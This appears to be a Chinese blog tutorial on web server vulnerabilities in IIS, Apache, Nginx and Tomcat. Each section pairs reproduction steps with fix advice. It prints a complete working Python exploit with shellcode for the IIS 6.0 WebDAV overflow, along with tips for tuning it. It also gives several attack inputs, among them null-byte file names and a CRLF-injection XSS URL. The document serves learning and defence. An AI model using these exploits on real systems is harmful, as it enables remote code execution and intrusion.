<p>关闭WebDAV 和 写权限</p>
<h3 id="IIS-短文件漏洞短文件漏洞"><a href="#IIS-短文件漏洞短文件漏洞" class="headerlink" title="IIS 短文件漏洞短文件漏洞"></a>IIS 短文件漏洞短文件漏洞</h3><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短<br>文件名的效果。</p>
<p>IIS短文件名产生：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当后缀小于 4 时，短文件名产生需要文件(夹)名前缀字符长度大于等于 9 位。</span><br><span class="line">2.当后缀大于等于 4 时，文件名前缀字符长度即使为 1 ，也会产生短文件名。</span><br></pre></td></tr></table></figure>

<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>复现：</p>
<p>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。<br>以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p>当访问构造的某个存在的短文件名，会返回 404 ；</p>
<p>当访问构造的某个不存在的短文件名，会返回 400 ；</p>
<p>IIS短文件漏洞局限性</p>
<ol>
<li><p>如果文件名本身太短也是无法猜解的；</p>
</li>
<li><p>此漏洞只能确定前 6 个字符，如果后面的字符太长、包含特殊字符，很难猜解；</p>
</li>
<li><p>如果文件名前 6 位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p>
</li>
<li><p>如果文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</p>
</li>
<li><p>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过 4 个中文字会产生短文件名，但是IIS不支持中文猜测。</p>
</li>
</ol>
<p>短文件利用工具下载</p>
<p>修复建议修复建议</p>
<p>1 ）从CMD命令关闭NTFS 8.3文件格式的支持</p>
<p>Windows Server 2003： (1代表关闭， 0 代表开启）<br>关闭该功能：fsutil behavior set disable8dot3 1</p>
<p>Windows Server 2008 R2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询是否开启短文件名功能：fsutil 8dot3name query</span><br><span class="line">关闭该功能：fsutil 8dot3name set 1</span><br></pre></td></tr></table></figure>

<p>不同系统关闭命令稍有区别，该功能默认是开启的.</p>
<p>2 ）或从修改注册表关闭NTFS 8.3文件格式的支持</p>
<p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口</p>
<p>找到路径：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1 ， 1 代表不创建短文件<br>名格式</p>
<p>以上两种方式修改完成后，均需要重启系统生效。</p>
<p>Note:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。<br>例:将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到c:\www。</p>
<h3 id="HTTP-SYS-远程代码执行远程代码执行-MS15-034"><a href="#HTTP-SYS-远程代码执行远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS 远程代码执行远程代码执行 (MS15-034)"></a>HTTP.SYS 远程代码执行远程代码执行 (MS15-034)</h3><p>影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R</p>
<p>复现：</p>
<p>在Windows7上 安装IIS7.5。<br>1.访问。</p>
<p>2.编辑请求头，增加Range: bytes&#x3D;0-18446744073709551615字段，若返回码状态为416 Requested Range Not Satisfiable，则存在HTTP.SYS远程代码执<br>行漏洞</p>
<p>漏洞有点鸡肋，配合其他漏洞使用还是可以用用的，具体使用可转至MSF中。</p>
<p>修复建议修复建议</p>
<p>安装修复补丁（KB3042553）</p>
<h3 id="RCE-CVE-2017"><a href="#RCE-CVE-2017" class="headerlink" title="RCE-CVE-2017-"></a>RCE-CVE-2017-</h3><p>Microsoft Windows Server 2003 R2中的Internet信息服务（IIS）6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过<br>以”If：&lt;http：&#x2F;&#x2F;“开头的长标头执行任意代码PROPFIND请求。</p>
<p>影响范围：<br>在Windows 2003 R2（Microsoft(R) Windows(R) Server 2003, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
<p>复现：<br>CVE作者给出的exp 计算机弹弹弹！！！<br>用python2 运行，结果如下。</p>
<p>任务管理器开启了calc.exe进程，因为计算器是网络服务权限打开的，所以我们在桌面上看不见。</p>
<p>这个漏洞有几个需要注意的地方，如下。</p>
<p>由于作者提供的Exp执行之后就卡在那里了，因此不适合用弹计算机的shellcode进行测试，网上找了个dalao的回显shellcode来测试。</p>
<p>首先将上图中python2 IDE运行时产生的Raw类型的HTTP数据包copy保存至记事本中，然后在Burp Repeater模块 Paste from file。</p>
<p>将shellcode更换成如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>CVE作者给出的Exp是在默认端口，默认域名，默认路径的情况下适用。</p>
<p>第一个需要注意的是端口和域名绑定问题：</p>
<p>当端口改变时，If头信息中的两个url端口要与站点端口一致，如下。</p>
<p>当域名改变时，If头信息中的两个url域名要与站点域名一致，且HOST头也要与站点域名一致。如下</p>
<p>不修改Host将返回502,如下</p>
<p>Note:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试的时候凡是需要修改IIS配置的操作，修改完毕后都需要重启IIS，</span><br><span class="line">或者在不超过禁用阈值的前提下结束w3wp进程。</span><br></pre></td></tr></table></figure>

<p>第二个需要注意的是物理路径问题：</p>
<p>CVE作者提供的Exp是在 默认路径长度等于19(包括结尾的反斜杠)的情况下适用，IIS默认路径一般为：c:\inetpub\wwwroot</p>
<p>解决方法：</p>
<p>当路径长度小于 19 时需要对padding进行添加。<br>当路径长度大于 19 时需要对padding进行删除。</p>
<p>ROP和stackpivot前面的padding实际上为UTF8编码的字符，每三个字节解码后变为两个字节的UTF16字符，在保证Exp不出错的情况下，有0x58个字符是<br>没用的。所以可以将前0x108个字节删除，换成0x58个a或b。</p>
<p>原exp 修改后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf-</span><br><span class="line">import socket</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((&#x27;192.168.124.129&#x27;,8888))</span><br><span class="line">pay=&#x27;PROPFIND / HTTP/1.1\r\nHost: http://www.lxhsec.com\r\nContent-Length: 0\r\n&#x27;</span><br><span class="line">pay+=&#x27;If: &lt;http://www.lxhsec.com:8888/aaaaaaa&#x27;</span><br><span class="line">pay+=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">pay+=&#x27;\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac&#x27;</span><br><span class="line">pay+=&#x27;&gt;&#x27;</span><br><span class="line">pay+=&#x27; (Not &lt;locktoken:write1&gt;) &lt;http://www.lxhsec.com:8888/bbbbbbb&#x27;</span><br><span class="line">pay+=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span><br><span class="line">pay+=&#x27;\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81&#x27;</span><br><span class="line">shellcode=&#x27;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A&#x27;</span><br><span class="line">pay+=shellcode</span><br><span class="line">pay+=&#x27;&gt;\r\n\r\n&#x27;</span><br><span class="line">print pay</span><br><span class="line">sock.send(pay)</span><br><span class="line">data = sock.recv(80960)</span><br><span class="line">print data</span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure>

<p>执行：</p>
<p>当路径长度小于 19 时，如下，需要增加 12 个a，b</p>
<p>而实际中路径常常大于 19 ，需要对padding进行删除。</p>
<p>当路径为c:\www\的时候，a有 107 个，加起来有 114 个，除去盘符有 111 个字符，所以可以把Exp的padding增加至 111 ，并逐次进行减少。当长度不匹配时返</p>
<p>回 500 ，成功时返回 200 ，通过爆破方式得到物理路径长度。<br>成功:</p>
<p>失败:</p>
<p>当然如果能得到物理路径，则用 114 减去物理路径长度（包括末尾的反斜杠）就是所需的padding长度。</p>
<p>第三个需要注意的是，超时问题。</p>
<p>当exp执行成功一段时间之后（大概十分钟到二十分钟左右，其间无论有无访问），再对这个站点执行exp永远不会成功，同时返回 400 。</p>
<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
<p>第四个需要注意的是，多次执行错误shellcode</p>
<p>多次执行错误的shellcode会覆盖很多不该覆盖的代码，从而导致正确的shellcode执行时也返回 500 ，<br>提示信息为：参数不正确，也可能什么都不返回。</p>
<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
<p>修复建议修复建议</p>
<p>关闭 WebDAV</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务<br>器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。</p>
<h4 id="解析漏洞解析漏洞-1"><a href="#解析漏洞解析漏洞-1" class="headerlink" title="解析漏洞解析漏洞"></a>解析漏洞解析漏洞</h4><p>未知扩展名解析漏洞未知扩展名解析漏洞</p>
<p>Apache的解析漏洞依赖于一个特性： <strong>Apache</strong> 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 <strong>mime.types</strong> 文件内），则文件内），则<br>继续向左识别，直到识别到合法后缀才进行解析。继续向左识别，直到识别到合法后缀才进行解析。</p>
<p>复现：<br>这里使用phpstudy进行复现。<br>下载地址：<br><a href="http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip">http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip</a></p>
<p>访问phpinfo.php.xxx</p>
<p>实战中可以上传rar，owf等文件进行利用，如果上传phpinfo.php.jpg，即使文件名中有.php，也会直接解析为jpg。因为Apache认识.jpg,停止继续向左识别。</p>
<h5 id="AddHandler-导致的解析漏洞。导致的解析漏洞。"><a href="#AddHandler-导致的解析漏洞。导致的解析漏洞。" class="headerlink" title="AddHandler 导致的解析漏洞。导致的解析漏洞。"></a>AddHandler 导致的解析漏洞。导致的解析漏洞。</h5><p>如果运维人员给.php后缀增加了处理器：<br>AddHandler application&#x2F;x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>复现：</p>
<p>即使最右边的文件格式是在mime.types文件内，只要文件名中出现.php，就直接被解析为php。</p>
<h5 id="Apache-HTTPD-换行解析漏洞（换行解析漏洞（-CVE-2017-15715-））"><a href="#Apache-HTTPD-换行解析漏洞（换行解析漏洞（-CVE-2017-15715-））" class="headerlink" title="Apache HTTPD 换行解析漏洞（换行解析漏洞（ CVE-2017-15715 ））"></a>Apache HTTPD 换行解析漏洞（换行解析漏洞（ CVE-2017-15715 ））</h5><p>影响范围：2.4.0~2.4.29版本<br>环境：phpstudy2014 Apache + PHP5.4n</p>
<p>此漏洞形成的根本原因，在于$, 正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r</p>
<p>在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">$name = basename($_POST[&#x27;name&#x27;]);</span><br><span class="line">$ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;, &#x27;phtml&#x27;, &#x27;pht&#x27;])) &#123;</span><br><span class="line">exit(&#x27;bad file&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &#x27;./&#x27;. $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>点击Go后，效果如下:</p>
<p>相同代码在Linux下进行测试，可以正常写入。</p>
<p>访问：</p>
<p>限制：获取文件名时不能用$_FILES[‘file’][‘name’]，因为它会自动把换行去掉。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 升级到最新版本</span><br><span class="line">2. 或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</span><br></pre></td></tr></table></figure>

<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事<br>实上nginx的并发能力确实在同类型的网页服务器中表现较好，</p>
<h3 id="Nginx-配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞"><a href="#Nginx-配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞" class="headerlink" title="Nginx 配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞"></a>Nginx 配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞</h3><p>对于任意文件名，在后面添加&#x2F;xxx.php（xxx为任意字符）后,即可将文件作为php解析。</p>
<p>例：info.jpg后面加上&#x2F;xxx.php，会将info.jpg 以php解析。</p>
<p>这里使用phpstudy2014 ，Nginx + PHP5.3n进行复现(以下复现若无特别说明均采用此环境)<br>结果：</p>
<p>该漏洞是Nginx配置所导致，与Nginx版本无关，下面是常见的漏洞配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">root /work/www/test;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME</span><br><span class="line">$document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">fastcgi_pass unix:/tmp/php-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当攻击者访问&#x2F;info.jpg&#x2F;xxx.php时， Nginx将查看URL，看到它以.php结尾，并将路径传递给PHP fastcgi处理程序。<br>Nginx传给php的路径为c:&#x2F;WWW&#x2F;info.jpg&#x2F;xxx.php,<br>在phpinfo中可以查看_SERVER[“ORIG_SCRIPT_FILENAME”]得到。</p>
<p>PHP根据URL映射，在服务器上寻找xxx.php文件，但是xxx.php不存在，又由于cgi.fix_pathinfo默认是开启的，因此PHP 会继续检查路径中存在的文件，并将<br>多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，而后以PHP的形式执行.jpg的内容，并将&#x2F;xxx.php存储在 PATH_INFO 后丢弃，因此我们<br>在phpinfo中的$_SERVER[‘PATH_INFO’]看的到值为空。</p>
<p>Note: <strong>php</strong> 的一个选项：的一个选项： <strong>cgi.fix_pathinfo</strong> ，该选项默认开启，值为，该选项默认开启，值为 <strong>1</strong> ，用于修理路径，，用于修理路径，<br>例如：当php遇到文件路径”&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec”时，若”&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec”不存在，则会去掉最后的”&#x2F;lxh.sec”，然后判断”&#x2F;info.jpg&#x2F;xxx.php”是否存</p>
<p>在, 若存在则将&#x2F;info.jpg&#x2F;xxx.php当作文件&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec，若&#x2F;info.jpg&#x2F;xxx.php仍不存在，则继续去掉xxx.php,依此类推。</p>
<p>修复建议修复建议</p>
<p>1.配置cgi.fix_pathinfo(php.ini中)为 0 并重启php-cgi程序</p>
<p>结果：</p>
<p>2.或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p>
<p>3.或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</p>
<h3 id="Nginx-空字节任意代码执行漏洞空字节任意代码执行漏洞"><a href="#Nginx-空字节任意代码执行漏洞空字节任意代码执行漏洞" class="headerlink" title="Nginx 空字节任意代码执行漏洞空字节任意代码执行漏洞"></a>Nginx 空字节任意代码执行漏洞空字节任意代码执行漏洞</h3><p>影响版本：Nginx 0.5*, 0.6*,0.7 &lt;&#x3D; 0.7.65,0.8 &lt;&#x3D; 0.8.</p>
<p>这里提供个打包好的Windows环境 Nginx 0.7.65+php 5.3.</p>
<p>链接：<a href="https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw">https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw</a><br>提取码：imdm</p>
<p>解压后，在Nginx目录下执行startup.bat</p>
<p>然后在nginx-0.7.65&#x2F;html&#x2F;目录下创建info.jpg,内容为,</p>
<p>访问info.jpg，并抓包，修改为info.jpg..php，在Hex选修卡中将jpg后面的.，更改为 00.</p>
<p>Note:该漏洞不受cgi.fix_pathinfo影响，当其为 0 时，依旧解析。</p>
<p>修复建议修复建议</p>
<p>升级Nginx版本</p>
<h3 id="Nginx-文件名逻辑漏洞（文件名逻辑漏洞（-CVE-2013-4547-））"><a href="#Nginx-文件名逻辑漏洞（文件名逻辑漏洞（-CVE-2013-4547-））" class="headerlink" title="Nginx 文件名逻辑漏洞（文件名逻辑漏洞（ CVE-2013-4547 ））"></a>Nginx 文件名逻辑漏洞（文件名逻辑漏洞（ CVE-2013-4547 ））</h3><p>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.</p>
<p>在Windows弄了个环境，后来发现要文件名的后面存在空格，而Windows是不允许存在此类文件的，因此这里复现，使用Vulhub的docker进行复现。</p>
<p>访问<a href="http://your-ip:8080/">http://your-ip:8080/</a> 上传文件</p>
<p>访问<a href="http://your-ip:8080/uploadfiles/info.jpg">http://your-ip:8080/uploadfiles/info.jpg</a>, 并抓包，修改为info.jpg…php, 在Hex选修卡中将jpg后面的两个点2e改成 20 , 00<br>点击Go,如下。</p>
<p>Note:该漏洞不受cgi.fix_pathinfo影响，当其为 0 时，依旧解析，在Windows上有所限制。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 设置security.limit_extensions = .php</span><br><span class="line">2. 或升级Nginx</span><br></pre></td></tr></table></figure>

<h3 id="Nginx-配置错误导致的安全问题配置错误导致的安全问题"><a href="#Nginx-配置错误导致的安全问题配置错误导致的安全问题" class="headerlink" title="Nginx 配置错误导致的安全问题配置错误导致的安全问题"></a>Nginx 配置错误导致的安全问题配置错误导致的安全问题</h3><h5 id="CRLF-注入注入"><a href="#CRLF-注入注入" class="headerlink" title="CRLF 注入注入"></a>CRLF 注入注入</h5><p>查看Nginx文档，可以发现有三个表示uri的变量：<br>1.$uri<br>2.$document_uri<br>3.$request_uri</p>
<p>1 和 2 表示的是解码以后的请求路径，不带参数； 3 表示的是完整的URI（没有解码）</p>
<p>Nginx会将 1 ， 2 进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p>
<p>错误配置:</p>
<p>访问：<br>[<a href="http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E]">http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E]</a>(<a href="http://127.0.0.1/">http://127.0.0.1/</a> X-XSS-Protection: 0  )<br>将返回包的Location端口设置为小于 80 ，使得浏览器不进行跳转，执行XSS。</p>
<p>结果：</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">return 302 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录穿越目录穿越</p>
<p>Nginx在配置别名（Alias）的时候，如果忘记加&#x2F;，将造成一个目录穿越漏洞。</p>
<p>错误的配置文件示例（原本的目的是为了让用户访问到C:&#x2F;WWW&#x2F;home&#x2F;目录下的文件）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">autoindex on;</span><br><span class="line">alias c:/WWW/home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>修复建议修复建议</p>
<p>只需要保证location和alias的值都有后缀&#x2F;或都没有&#x2F;这个后缀。</p>
<p>目录遍历目录遍历</p>
<p>当Nginx配置文件中，autoindex 的值为on时，将造成一个目录遍历漏洞。</p>
<p>结果:</p>
<p>修复建议修复建议</p>
<p>将autoindex 的值为置为off。</p>
<h5 id="add-header-被覆盖被覆盖"><a href="#add-header-被覆盖被覆盖" class="headerlink" title="add_header 被覆盖被覆盖"></a>add_header 被覆盖被覆盖</h5><p>Nginx的配置文件分为Server、Location等一些配置块，并且存在包含关系，子块会继承父块的一些选项，比如add_header。</p>
<p>如下配置中，整站（父块中）添加了CSP头：</p>
<p>正常情况下访问:</p>
<p>当访问 &#x2F;test2时，XSS被触发。因&#x2F;test2的location中添加了X-Content-Type-Options头，导致父块中的add_header全部失效。</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发<br>和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个<br>应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进</p>
<p>程单独运行的。</p>
<h3 id="Tomcat-任意文件写入（任意文件写入（-CVE-2017-12615-））"><a href="#Tomcat-任意文件写入（任意文件写入（-CVE-2017-12615-））" class="headerlink" title="Tomcat 任意文件写入（任意文件写入（ CVE-2017-12615 ））"></a>Tomcat 任意文件写入（任意文件写入（ CVE-2017-12615 ））</h3><p>环境：Tomcat&#x2F;8.0.30</p>
<p>漏洞本质是Tomcat配置文件&#x2F;conf&#x2F;web.xml 配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件：</p>
<p>增加完配置之后，记得重启Tomcat，效果如下:</p>
<p>当readonly&#x3D;true时，效果如下。</p>
<p>修复建议修复建议</p>
<p>将readonly&#x3D;true，默认为true。</p>
<h3 id="Tomcat-远程代码执行（远程代码执行（-CVE-2019-0232-））"><a href="#Tomcat-远程代码执行（远程代码执行（-CVE-2019-0232-））" class="headerlink" title="Tomcat 远程代码执行（远程代码执行（ CVE-2019-0232 ））"></a>Tomcat 远程代码执行（远程代码执行（ CVE-2019-0232 ））</h3><p>影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93<br>影响系统： Windows</p>
<p>测试环境：<br>Apache Tomcat v8.5.39<br>JDK 1.8.0_144</p>
<p>修改配置：<br>web.xml</p>
